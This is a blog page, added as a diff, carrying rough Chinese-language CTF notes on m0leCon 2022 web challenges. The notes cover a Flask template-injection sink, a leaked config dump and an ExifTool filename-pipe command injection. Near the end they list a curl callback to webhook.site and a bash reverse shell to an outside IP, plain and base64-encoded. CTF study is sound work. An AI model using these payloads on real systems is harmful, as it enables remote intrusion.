@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 Dumb Forum You’re telling me you can’t break such a simple forum  flag在环境变量里 1ENV FLAG&#x3D;&amp;#x27;ptm&amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="m0leCon-CTF-2022">
+<meta property="og:url" content="http://example.com/2022/05/14/m0leCon-CTF-2022/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 Dumb Forum You’re telling me you can’t break such a simple forum  flag在环境变量里 1ENV FLAG&#x3D;&amp;#x27;ptm&amp;#123">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png">
+<meta property="article:published_time" content="2022-05-14T03:57:39.000Z">
+<meta property="article:modified_time" content="2022-05-14T16:39:41.728Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png">
+
+
+<link rel="canonical" href="http://example.com/2022/05/14/m0leCon-CTF-2022/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/05/14/m0leCon-CTF-2022/","path":"2022/05/14/m0leCon-CTF-2022/","title":"m0leCon-CTF-2022"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>m0leCon-CTF-2022 | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">20</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">10</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">40</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#m0leCon-CTF-2022"><span class="nav-number">1.</span> <span class="nav-text">m0leCon CTF 2022</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack-pt-MD"><span class="nav-number">2.1.</span> <span class="nav-text">hack(pt)MD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumb-Forum"><span class="nav-number">2.2.</span> <span class="nav-text">Dumb Forum</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/m0leCon-CTF-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="m0leCon-CTF-2022 | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          m0leCon-CTF-2022
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-05-14 11:57:39" itemprop="dateCreated datePublished" datetime="2022-05-14T11:57:39+08:00">2022-05-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-05-15 00:39:41" itemprop="dateModified" datetime="2022-05-15T00:39:41+08:00">2022-05-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="m0leCon-CTF-2022"><a href="#m0leCon-CTF-2022" class="headerlink" title="m0leCon CTF 2022"></a><strong>m0leCon CTF 2022</strong></h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hack-pt-MD"><a href="#hack-pt-MD" class="headerlink" title="hack(pt)MD"></a>hack(pt)MD</h3><blockquote>
+<p>Hey, do you like <a target="_blank" rel="noopener" href="https://hackptmd.m0lecon.fans/">markdown</a>?</p>
+<p><em>Author: @Xato</em></p>
+<p><a target="_blank" rel="noopener" href="https://ctf.m0lecon.it/attachments/8bb18abd5afe427a9fe785c5ffb32205/hackptmd.zip">hackptmd.zip</a></p>
+</blockquote>
+<p><code>jackma:123456</code></p>
+<h3 id="Dumb-Forum"><a href="#Dumb-Forum" class="headerlink" title="Dumb Forum"></a>Dumb Forum</h3><blockquote>
+<p>You’re telling me you can’t break such a simple <a target="_blank" rel="noopener" href="https://microforum.m0lecon.fans/">forum</a></p>
+</blockquote>
+<p>flag在环境变量里</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> FLAG=<span class="string">&#x27;ptm&#123;REDACTED&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>估计要读文件或者rce</p>
+<p>估计是要走数据库来搞事情</p>
+<p>看看输入的过滤</p>
+<p>这里应该是防 username 的模版注入 但是一人出 全员出 肯定不可能</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validate_username</span>(<span class="params">self, username</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#125;&#123;&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> username.data:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&#x27;Please use valid characters.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>感觉在这里搞一下数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EditProfileForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = StringField(<span class="string">&#x27;Username&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    about_me = TextAreaField(<span class="string">&#x27;About me&#x27;</span>, validators=[Length(<span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">1000</span>)])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Submit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, original_username, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(EditProfileForm, self).__init__(*args, **kwargs)</span><br><span class="line">        self.original_username = original_username</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_username</span>(<span class="params">self, username</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#125;&#123;&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> username.data:</span><br><span class="line">                abort(<span class="number">400</span>)</span><br><span class="line">                <span class="comment">#raise ValidationError(&#x27;Please use valid characters.&#x27;)</span></span><br><span class="line">        <span class="keyword">if</span> username.data != self.original_username:</span><br><span class="line">            user = User.query.filter_by(username=self.username.data).first()</span><br><span class="line">            <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                abort(<span class="number">409</span>)</span><br><span class="line">                <span class="comment">#raise ValidationError(&#x27;Please use a different username.&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_about_me</span>(<span class="params">self, about_me</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#125;&#123;&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> about_me.data:</span><br><span class="line">                abort(<span class="number">400</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看一下数据库的操作</p>
+<p><img src="/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png" alt="image-20220514124017454"></p>
+<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+2474">https://www.compart.com/en/unicode/U+2474</a></p>
+<p><a target="_blank" rel="noopener" href="https://pypi.org/project/email-validator/">https://pypi.org/project/email-validator/</a></p>
+<p>或许是拿config里面的东西来打 。。。</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Email: &lt;Config &#123;<span class="string">&#x27;ENV&#x27;</span>: <span class="string">&#x27;production&#x27;</span>, <span class="string">&#x27;DEBUG&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;TESTING&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SECRET_KEY&#x27;</span>: b<span class="string">&#x27;,\xea\xec\x99\xb1\xc2O/!\xbe\x8d\x1c\x95\xa3&gt;`\xcf\xbe[\xbbeS\x06=)\xd8\x84\x18\x92Y\xed\x91&#x27;</span>, <span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=<span class="number">31</span>), <span class="string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="number">4093</span>, <span class="string">&#x27;BOOTSTRAP_USE_MINIFIED&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;BOOTSTRAP_CDN_FORCE_SSL&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;BOOTSTRAP_QUERYSTRING_REVVING&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;BOOTSTRAP_SERVE_LOCAL&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;BOOTSTRAP_LOCAL_SUBDOMAIN&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>: <span class="string">&#x27;sqlite:////microforum/db/app.db&#x27;</span>, <span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SQLALCHEMY_BINDS&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_NATIVE_UNICODE&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_ECHO&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SQLALCHEMY_RECORD_QUERIES&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_POOL_SIZE&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_POOL_TIMEOUT&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_POOL_RECYCLE&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_MAX_OVERFLOW&#x27;</span>: <span class="built_in">None</span>, <span class="string">&#x27;SQLALCHEMY_COMMIT_ON_TEARDOWN&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;SQLALCHEMY_ENGINE_OPTIONS&#x27;</span>: &#123;&#125;&#125;&gt;aa@a.com</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://qntm.org/safe">https://qntm.org/safe</a></p>
+<p><a target="_blank" rel="noopener" href="https://trojansource.codes/">https://trojansource.codes/</a></p>
+<p>是不是从这里能得到 sqlite 相关的信息?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;app/templates/profile.html&#x27;</span>) <span class="keyword">as</span> p:</span><br><span class="line">        profile_html = p.read()</span><br><span class="line">    </span><br><span class="line">    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current_user.about_me == <span class="literal">None</span>):</span><br><span class="line">        current_user.about_me = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(profile_html)</span><br></pre></td></tr></table></figure>
+
+<p>这几个可不可以连着用?</p>
+<p>或者一个调用另外一个？</p>
+<p>去读一下 python的模板 。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATEXT_INTL = ATEXT + <span class="string">u&quot;\u0080-\U0010FFFF&quot;</span></span><br><span class="line">DOT_ATOM_TEXT_INTL = <span class="string">&#x27;[&#x27;</span> + ATEXT_INTL + <span class="string">&#x27;]+(?:\\.[&#x27;</span> + ATEXT_INTL + <span class="string">&#x27;]+)*&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ls pwn</span><br><span class="line">ls: cannot <span class="keyword">access</span> <span class="symbol">&#x27;pwn</span>&#x27;: No such <span class="keyword">file</span> <span class="keyword">or</span> directory</span><br><span class="line">$ touch <span class="symbol">&#x27;touch</span> pwn |&#x27;</span><br><span class="line">$ ./exiftool <span class="symbol">&#x27;touch</span> pwn |&#x27;</span><br><span class="line">ExifTool Version Number         : <span class="number">12.37</span></span><br><span class="line"><span class="keyword">File</span> Name                       : touch pwn |</span><br><span class="line">Directory                       : .</span><br><span class="line"><span class="keyword">File</span> Size                       : <span class="number">0</span> bytes</span><br><span class="line"><span class="keyword">File</span> Modification Date/<span class="built_in">Time</span>     : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> <span class="keyword">Access</span> Date/<span class="built_in">Time</span>           : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> Inode Change Date/<span class="built_in">Time</span>     : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> Permissions                : prw<span class="comment">-------</span></span><br><span class="line"><span class="literal">Error</span>                           : <span class="keyword">File</span> <span class="keyword">is</span> empty</span><br><span class="line">$ ls pwn</span><br><span class="line">pwn</span><br></pre></td></tr></table></figure>
+
+<p>想办法构造</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> https://webhook.site/<span class="number">3468</span>de44-<span class="number">3</span>fe9-<span class="number">4692</span>-ab8e-<span class="number">373</span>fa43ea184 |</span><br></pre></td></tr></table></figure>
+
+<p>想一下怎么去掉前缀就行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/xxx/</span>xxx<span class="regexp">/curl https:/</span><span class="regexp">/webhook.site/</span><span class="number">3468</span>de44-<span class="number">3</span>fe9-<span class="number">4692</span>-ab8e-<span class="number">373</span>fa43ea184 |</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Failed</span> check image type: &#123;&amp;#<span class="number">34</span>;exception&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;ExifToolExecuteError(&amp;#<span class="number">39</span>;execute returned a non-zero exit status: <span class="number">1</span>&amp;#<span class="number">39</span>;)&amp;#<span class="number">34</span>;, &amp;#<span class="number">34</span>;status&amp;#<span class="number">34</span>;: <span class="number">1</span>, &amp;#<span class="number">34</span>;stdout&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;[&#123;\n  \&amp;#<span class="number">34</span>;SourceFile\&amp;#<span class="number">34</span>;: \&amp;#<span class="number">34</span>;avatars/<span class="number">131</span>/|\&amp;#<span class="number">34</span>;\n&#125;]\n&amp;#<span class="number">34</span>;, &amp;#<span class="number">34</span>;stderr&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;Can&amp;#<span class="number">39</span>;t exec \&amp;#<span class="number">34</span>;avatars/<span class="number">131</span>/\&amp;#<span class="number">34</span>;: Permission denied at /usr/share/perl5/Image/ExifTool.pm line <span class="number">4130</span>.\nError: Error opening file - avatars/<span class="number">131</span>/|\n&amp;#<span class="number">34</span>;&#125;. Powered by ExifTool <span class="number">12</span>.<span class="number">37</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/101.43.33.148/</span><span class="number">10099</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">base64版：bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMzMuMTQ4LzEwMDk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这么绕过?</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/05/14/m0leCon-CTF-2022/" title="m0leCon-CTF-2022">http://example.com/2022/05/14/m0leCon-CTF-2022/</a>
+  </li>
+  <li class="post-copyright-license">
